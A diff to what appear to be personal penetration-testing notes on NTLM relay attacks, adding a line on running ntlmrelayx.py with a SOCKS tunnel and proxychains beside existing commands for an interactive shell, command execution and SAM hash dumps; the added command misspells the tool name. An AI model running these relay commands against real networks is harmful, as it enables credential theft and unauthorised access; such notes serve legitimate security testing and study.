@@ -44,6 +44,8 @@ Step 5 (Win): get the local SAM hash dump (**Security Account Manager (SAM) data
 Other Wins: 
 1. `sudo ntlmrelayx.py -tf targets.txt -smb2support -i` : the `-i` gives a interactive shell as opposed to just getting a hash dump![[Pasted image 20251127110558.png]]![[Pasted image 20251127110652.png]] `nc 127.0.0.1 11000`
 2. `sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"` : run commands
+3. `sudo mtlmrelayx.py -tf targets.txt -smb2support -socks` : to run a socks tunnel and the use proxychains to run any command over the tunnel  
+Do not forget to change your SOCKS proxy configuration before going all bananas.
 
 
 ----
